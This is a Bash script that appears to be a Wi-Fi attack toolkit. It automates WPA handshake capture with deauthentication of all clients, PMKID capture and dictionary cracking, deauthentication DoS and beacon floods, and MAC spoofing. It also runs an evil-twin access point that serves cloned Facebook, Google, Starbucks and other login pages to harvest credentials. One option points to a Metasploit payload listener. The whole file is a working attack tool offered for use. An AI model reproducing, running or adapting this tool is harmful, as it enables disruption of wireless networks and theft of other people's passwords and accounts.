#!/bin/bash

# Modulo de colores 
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
cleancolor="echo -e "${endColour}""

trap ctrl_c INT

ctrl_c() {
	echo -e "\n\n${redColour}[!]${endColour}${grayColour} Exit...${endColour}\n" 
	tput civis
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	tput cnorm
	sudo rm dnsmasq.conf hostapd.conf 2>/dev/null
	rm -r iface 2>/dev/null
	sudo rm Handshake* 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	exit
}
test -f /etc/debian_version
debian=$(echo $?)
	
test -f /etc/arch-release
arch=$(echo $?)

test -f /etc/redhat-release
fedora=$(echo $?)

programs() {
	
	dependencias=(aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd mdk3 gunzip)
	
	if [ "$debian" -eq 0 ]; then 
		clear; tput civis
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
			sleep 0.5
			echo -e "\n${greenColour}[+]$grayColour macchanger"
		else
			echo -e "${blueColour}[*]$grayColour Installing macchanger..."
			sudo apt-get install macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
		fi
		
		for program in "${dependencias[@]}"; do
			
			test -f /usr/bin/$program

			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "\n${greenColour}[+]$grayColour $program"
				sleep 0.5
			else
				test -f /usr/sbin/$program
				if [ "$(echo $?)" -eq 0 ]; then
					echo -e "\n${greenColour}[+]$grayColour $program"
					sleep 0.5
				else
					echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
					sudo apt-get install $program -y > /dev/null 2>&1
				fi
			fi

		done
	elif [ "$arch" -eq 0 ]; then
		clear; tput civis
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ "$mactest" -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
			sleep 0.5
			echo -e "\n${greenColour}[+]$grayColour macchanger"
		else
			echo -e "${blueColour}[*]$grayColour Installing macchanger..."
			sudo pacman -S macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
		fi
		
		for program in "${depasendencias[@]}"; do
			
			test -f /usr/bin/$program
			
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "\n${greenColour}[+]$grayColour $program"
				sleep 0.5
			else
				test -f /usr/sbin/$program
				if [ "$(echo $?)" -eq 0 ]; then
					echo -e "\n${greenColour}[+]$grayColour $program"
					sleep 0.5
				else
					echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
					sudo pacman -S $program -y > /dev/null 2>&1
				fi
			fi	
		done
	elif [ "$fedora" -eq 0 ]; then
		clear; tput civis
		test -f /usr/bin/macchanger
		mactest=$(echo $?)
		if [ $mactest -eq 0 ]; then
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
			sleep 0.5
			echo -e "\n${greenColour}[+]$grayColour macchanger"
		else
			echo -e "${blueColour}[*]$grayColour Installing macchanger..."
			sudo dnf install macchanger -y
			clear
			echo -e "\n${blueColour}[*]$grayColour Checking dependencies...\n"
		fi
		
		for program in "${dependencias[@]}"; do
			
			test -f /usr/bin/$program
			
			if [ "$(echo $?)" -eq 0 ]; then
				echo -e "\n${greenColour}[+]$grayColour $program"
				sleep 0.5
			else
				test -f /usr/sbin/$program
				if [ "$(echo $?)" -eq 0 ]; then
					echo -e "\n${greenColour}[+]$grayColour $program"
					sleep 0.5
				else
					echo -e "\n${blueColour}[*]$grayColour Installing ${program}..." 
					sudo dnf install $program -y > /dev/null 2>&1
				fi
			fi
		done
	else 
		echo -e "\n${redColour}[!]$grayColour Can't find your distribution, download these programs manually: aircrack-ng xterm hashcat git nmap hcxtools php dnsmasq hostapd" 
		sleep 5
	fi
}
updatepackages() {
	clear; echo -ne "\n${blueColour}[?]$grayColour Do you want to update the packages? [Y/N]: " && read update 
	if [ "$update" == "y" ] || [ "$update" == "Y" ]; then
		if [ "$debian" -eq 0 ]; then
			clear; tput civis
			echo -e "\n${greenColour}[*]$grayColour Updating the packages..."
			sudo apt-get update -y > /dev/null 2>&1
			programs
		elif [ "$arch" -eq 0 ]; then
			clear; tput civis
			echo -e "${greenColour}[*]$grayColour Updating the packages..."
			sudo pacman -Syu -y > /dev/null 2>&1
			programs
		elif [ "$fedora" -eq 0 ]; then
			clear; tput civis
			echo -e "${greenColour}[*]$grayColour Updating the packages..."
			sudo dnf update -y > /dev/null 2>&1
			programs
		fi
	elif [ "$update" == " " ] || [ "$update" == "" ]; then 
		echo -e "${redColour}[!]$grayColour Select an option"
		updatepackages
	elif [ "$update" == "n" ] || [ "$update" == "N" ]; then
		programs
	fi

}
testhandshake() {
	test -f Handshake-01.cap
	if [ "$(echo $?)" == "0" ]; then
		tput cnorm
		test -f /usr/share/wordlists/rockyou.txt
		if [ "$(echo $?)" == "0" ]; then
			echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
			echo -ne "$blueColour[?]$grayColour Dictionary path to use: " && read dicc
			$cleancolor; tput civis
			xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
		else
			test -f /usr/share/wordlists/rockyou.txt.gz
			if [ "$(echo $?)" -eq 0 ]; then
				pathonher=$(pwd)
				cd /usr/share/wordlists
				sudo gunzip -d rockyou.txt.gz
				cd $pathonher
			else 
				echo -e "\n$redColour[!]$grayColour You don't have rockyou.txt in your system or it is in another directory"
			fi
		fi
	else 
		echo -e "${redColour}\n[!]$grayColour Handshake has not been captured"
		sleep 2
	fi
}

handshake_ataque() {
	clear
	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
	sleep 1
 	tput cnorm
	xterm -hold -e "airodump-ng ${tar}" &
	xtermnet=$!
	echo -ne "\n${greenColour}[?]$grayColour Select a network (Essid): " && read ap
	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
	tput civis
	$cleancolor; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
	echo -e "${greenColour}[!]$grayColour If you choose no, a global deauthentication will be performed on the network"
	tput cnorm; echo -ne "${greenColour}[?]$grayColour Do you want to add a MAC address for deauthentication?  [Y/N]: " && read macoption
	if [ "$macoption" == "Y" ] || [ "$macoption" == "y" ]; then
		echo -ne "\n${blueColour}[?]$grayColour MAC: " && read macdes
		echo -e "${greenColour}[*]$grayColour $macdes is deauthenticating"
		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
		airodump_filter_xtermMAC_PID=$!
		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c $macdes $tar" &
		aireplay_xtermMAC_PID=$!
		sleep 10; kill -9 $aireplay_xtermMAC_PID; wait $aireplay_xtermMAC_PID 2>/dev/null
		tput civis; echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
		$cleancolor
		sleep 10; kill -9 $airodump_filter_xtermMAC_PID
		wait $airodump_filter_xtermMAC_PID 2>/dev/null
		testhandshake
	elif [ "$macoption" == "n" ] || [ "$macoption" == "N" ]; then
		echo -e "${greenColour}[*]$grayColour Network users are being deauthenticated"
		$cleancolor
		xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
		airodump_filter_xterm_PID=$!

		sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
		aireplay_xterm_PID=$!
		sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		echo -e "${redColour}\n[%]$grayColour Waiting for Handshake\n"
		$cleancolor
									
		sleep 10; kill -9 $airodump_filter_xterm_PID
		wait $airodump_filter_xterm_PID 2>/dev/null
		testhandshake
	fi
}
# salida
salir() {
	echo -e "\n${redColour}[*]$grayColour Exiting and restarting the network card...\n" 
	tput civis
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sudo rm Handshake* > /dev/null 2>&1
	tput cnorm
	exit
}

# 2) ataque
pkmid_ataque() {
	clear
	echo -e "\n${greenColour}[*]$grayColour Starting PMKID attack...\n"
	sleep 1 
	echo -e "${blueColour}[!]$grayColour Recommendation: 600 seconds (10 minutes)"
	echo -ne "$purpleColour[?]$grayColour How many seconds do you want the packet capture to last?: " && read seg
	$cleancolor
	xterm -hold -e "hcxdumptool -i $tar -o Capture --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
	hcxdumptool_PID=$!
	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
    echo -e "\n${redColour}[%]$grayColour Capturing packages\n"
	hcxcaptool -z HASHPMKID Capture; sudo rm Capture 2>/dev/null
	sleep 1
	$cleancolor
	test -f HASHPMKID*
	if [ "$(echo $?)" -eq 0 ]; then
		echo -e "\n${yellowColour}[*]$grayColour Initiating brute force attack"
		sleep 1
		tput cnorm
		echo -e "\n${blueColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
		echo -ne "${greenColour}[?]$grayColour Dictionary path to use: " && read dicc1
		tput civis; echo -e "\n${yellowColour}[*] Preparing the package for brute force..."
		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
	else 
		echo -e "\n${redColour}[!]$grayColour The required package could not be captured"
		sleep 2
	fi
}
# 3) ataque
fuerza_.cap() {
	clear; echo -e "\n${greenColour}[*]$grayColour Starting Force Brute"
	sleep 1
	echo -e "\n${yellowColour}[*]$grayColour Path to rockyou.txt: /usr/share/wordlists/rockyou.txt"
	$cleancolor
	tput cnorm
	echo -ne "${blueColour}[?]$grayColour File path .cap: " && read cap
	tput civis; echo -ne "${redColour}[?]$grayColour Dictionary path to use: " && read dicc
	xterm -hold -e "aircrack-ng -w $dicc $cap"
}

fuerza_rainbow() {
	echo -ne "${greenColour}[?]$grayColour File path .cap : " && read cap
	cd WifiPwnedd
	xterm -hold -e "aircrack-ng -r dicc-hasheado $cap" 
}

rainbowtaibles() {
	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Taibles..."
	echo -ne "${blueColour}[?]$grayColour Dictionary path: " && read ruta
	sudo airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
	test -f dicc-hasheado
	if [ "$(echo $?)" -eq 0 ]; then
		echo -ne "${turquoiseColour}[?]$grayColour Essid or Network name: " && read ap 
		echo "$ap" > essid.lst
		sudo airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
		sudo airolib-ng dicc-hasheado --clean all 
		echo -ne "${redColour}[?]$grayColour How many seconds do you want the hasheo process to last?: " && read seg
		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
		batch_PID=$!
		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
		echo -e "\n${greenColour}[+]$grayColour Dictionary finish (name: dicc-hasheado)"
		echo -ne "${blueColour}[?]$grayColour Do you want to do a brute force attack with the dictionary? [Y/N]: " && read attak
		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
			fuerza_rainbow
		else
			echo -e "\n${redColour}[!]$grayColour Exit"
		fi
	else
		echo -e "\n${redColour}[!]$grayColour The dictionary could not be created or you have entered the wrong dictionary path"
		sleep 2
	fi
}

menuforce() {
	clear; echo -e "${yellowColour}\n1) Force Brute .cap"
	echo -e "2) Create hashed dictionary (Rainbow taibles)"
	echo -e "3) Force brute with dictionary hashed"
	echo -e "4) Exit"
	echo -ne "\n${yellowColour}[?]$grayColour Attack Force: " && read force 
	case $force in 
	1)
	fuerza_.cap
	;;
	2)
	rainbowtaibles
	;;
	3)
	fuerza_rainbow
	;;
	4)
	echo -e "\n${redColour}[*]$grayColour Exit..."
	;;
	*)
	echo -e "${redColour}\n[!]$grayColour Invalid option"
	sleep 2
	;;
	esac
}

scanner() {
	clear; echo -e "\n${greenColour}[*]$grayColour Starting Scanner"
	airmon-ng stop $tar > /dev/null 2>&1
	sudo /etc/init.d/networking start > /dev/null 2>&1
	sudo /etc/init.d/networking restart > /dev/null 2>&1
	sudo systemctl start NetworkManager > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	sleep 15
	tput civis; echo -e "\n---------------------------------------------------\n"
	sudo nmap -sP -Pn 192.168.1.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
	echo -e "\n---------------------------------------------------"
	echo -ne "${redColour}[!]$grayColour Enter to exit" && read 
	airmon-ng start $tar > /dev/null 2>&1
	ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
	ifconfig $tar up > /dev/null 2>&1
	airmon-ng check kill > /dev/null 2>&1
	tput cnorm
}

ntwkphishing() {
	
	credentials() {
		hosts=0 
		tput civis
		while true; do
			echo -e "\n${greenColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$hosts${endColour}\n"
			find \-name datos-privados.txt | xargs cat 2>/dev/null
			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
			hosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
			sleep 3; clear
		done
	}

	attack() {
		tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
		echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
		tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
		sleep 3
		echo -e "interface=${tar}\n" > hostapd.conf
		echo -e "driver=nl80211\n" >> hostapd.conf
		echo -e "ssid=$ssid\n" >> hostapd.conf
		echo -e "hw_mode=g\n" >> hostapd.conf
		echo -e "channel=$ch\n" >> hostapd.conf
		echo -e "macaddr_acl=0\n" >> hostapd.conf
		echo -e "auth_algs=1\n" >> hostapd.conf
		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
		echo -e "\n$yellowColour[*]$grayColour Configuring interface $tar"
		sleep 1; echo -e "$yellowColour[*]$grayColour Starting hostapd..."
		hostapd hostapd.conf > /dev/null 2>&1 &
		sleep 5
		echo -e "${yellowColour}[*]${grayColour} Configuring dnsmasq..."
		echo -e "interface=${tar}\n" > dnsmasq.conf
		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
		echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
		echo -e "server=8.8.8.8\n" >> dnsmasq.conf
		echo -e "log-queries\n" >> dnsmasq.conf
		echo -e "log-dhcp\n" >> dnsmasq.conf
		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
		sleep 1
		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
		sleep 1
		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
		sleep 3
		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
		cd src
		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
		tput cnorm
		echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
		check_logins=0; for login in "${logins[@]}"; do
			if [ "$login" == "$usedlogin" ]; then
					check_logins=1
			fi
		
			done
			
			if [ "$usedlogin" == "cliqq-payload" ]; then
				check_logins=2
			fi
			
			if [ $check_logins -eq 1 ]; then
				tput civis; pushd $usedlogin > /dev/null 2>&1
				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
				php -S 192.168.1.1:80 > /dev/null 2>&1 &
				sleep 2
				popd > /dev/null 2>&1; credentials
			elif [ $check_logins -eq 2 ]; then
				tput civis; pushd $usedlogin > /dev/null 2>&1
				echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
				php -S 192.168.1.1:80 > /dev/null 2>&1 &
				sleep 2
				echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
				for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
				cat msfconsole.rc
				for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
				echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
				popd > /dev/null 2>&1; credentials
			else
				tput civis; echo -e "\n${yellowColour}[*]${grayColour} Using custom template..."; sleep 1
				echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
				pushd $usedlogin > /dev/null 2>&1
				php -S 192.168.1.1:80 > /dev/null 2>&1 
				popd > /dev/null 2>&1; credentials
			fi
		cd ..
	}
	
	clear
	echo -e "\n$purpleColour[*]$grayColour Starting NTWK Phishing..."
	sleep 2
	attack
}
dosattack() {
	clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
	xterm -e "airodump-ng ${tar}" &
	dosairdump_PID=$!
	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid): " && read redos
	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
	sudo mdk3 $tar a -e $redos
}

beaconflood() {
	clear; echo -e "\n${purpleColour}[*]$grayColour Starting Beacon Flood attack..."; sleep 2
	echo -ne "\n${blueColour}[?]$grayColourYou Want to name the networks (Recommend (N) )? [Y/N]: " && read rpsbeacon 
	if [ "$rpsbeacon" == "y" ] || [ "$rpsbeacon" == "Y" ]; then
		echo -ne "${yelloColour}[?]$grayColour Name: " && read nameap
			xterm -hold -e "sudo mdk3 $tar b -n $nameap -s 1000"
	elif [ "$rpsbeacon" == "n" ] || [ "$rpsbeacon" == "N" ]; then
		xterm -hold -e "sudo mdk3 $tar b -s 1000"
	fi
	
}
bannerattack() {
	echo -e "	   ${blueColour}.--------."
	echo -e "${redColour}     :  ${blueColour}.-@#*==-!==+#@*-."
	echo -e "${redColour}     I__________${blueColour}%@%%#*-.${redColour}___"
	echo -e "${redColour}O====I__________${blueColour}#%%#*-.${redColour}_____>"
	echo -e "${redColour}     I    ${blueColour}.-*=:::::--."
	echo -e "${redColour}     :      ${blueColour}.-####-."
	echo -e "	      ${blueColour}.*_"
	echo -e "               ${blueColour}."
	$cleancolor
}
banner() {
	echo "  _       __  _   ____  _      ____                               __      __ "
	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  /   "
	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ /  "
	echo " |__/|__/ /_/ /_/   /_/    /_/      |__/|__/ /_/ /_/ \___/ \__,_/  \__,_/  "
}

menunomon() {
	bannerattack
	clear; echo -e "${yellowColour}\n1) Force Brute menu"
	echo -e "2) Scanner "
	echo -e "3) Exit"
	echo -ne "\n${yellowColour}[?]$grayColour Attack: " && read force
	case $force in 
	1)
	menuforce
	;;
	2)
	scanner
	;;
	3)
	echo -e "\n${redColour}[*]$grayColour Exit..."
	;;
	*)
	echo -e "${redColour}\n[!]$grayColour Invalid option"
	sleep 2
	;;
	esac
}
gui() {
	
}




# Comprobacion si el usuario es root
if [ $(id -u) -ne 0 ]; then
	echo -e "$redColour\n[!]$grayColour Must be root (sudo $0)\n"
	$cleancolor
	exit 1
# Programa principal
else
	updatepackages
	tput civis; clear
	echo -e "${turquoiseColour}"
	banner
	echo -e "\n${greenColour}[+]${grayColour} Version [1.0]"
	echo -e "\n${greenColour}[+]${grayColour} Github: https://github.com/kidd3n"
	echo -ne "${greenColour}[+]$grayColour Enter to continue" && read 
	$cleancolor
	tput cnorm
	echo -e "\n${redColour}[*]${endColour}${grayColour} Monitor mode is recommended and necessary for most attacks"
	sleep 1
	echo -ne "${purpleColour}[?]${grayColour} Do you want to put your network card in monitor mode? [Y/N]: " && read mon
	$cleancolor
		if [ "$mon" == "Y" ] || [ "$mon" == "y" ]; then 
			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			echo -ne "\n${redColour}[?]$grayColour Network card: " && read tar
			$cleancolor; tput civis
			airmon-ng start $tar > /dev/null 2>&1
			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
			tput cnorm; echo -ne "${redColour}\n[?]$grayColour Card confirmation (Enter the name exactly as it appears): " && read tar
			tput civis; echo -e "\n${greenColour}[*]${grayColour} Changing your MAC address on $tar\n"
			ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
			ifconfig $tar up
			airmon-ng check kill > /dev/null 2>&1
			tput civis; $cleancolor
				while true; do
				clear
				echo -e "${purpleColour}\n[+]$grayColour Attack Menu\n${endColour}"
				bannerattack
				sleep 0.5
				echo -e "${greenColour}\n[+]${grayColour} Network card: $tar"
				echo -e "${greenColour}[+]${grayColour} MAC: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
				echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
				echo -e "${yellowColour}\n[1] Handshake Attack\t\t[6] NTWK phishing\t[7] Force Brute .cap"
				echo -e "[2] PMKID Attack\t\t\t\t\t[8] dicc-hasheado (Rainbow taibles)"
				echo -e "[3] DoS Attack"
				echo -e "[4] Beacon Flood Attack"
				echo -e "[5] Scanner"
				echo -e "\n[9] Exit\n"
				tput cnorm
				echo -ne "${blueColour}[?]${grayColour} Attack: " && read opcion
				$cleancolor
				case $opcion in
				1)
				handshake_ataque
				;;
				2)
				pkmid_ataque
				;;
				3)
				dosattack
				;;
				4)
				beaconflood
				;;
				5)
				scanner
				;;
				6)
				ntwkphishing
				;;
				7)
				fuerza_.cap
				;;
				8)
				rainbowtaibles
				;;
				9)
				salir
				;;
				*)
				echo -e "${redColour}\n[!]$grayColour Invalid Option"; sleep 2
				;;
				esac
				done
		else
			menunomon
		fi
fi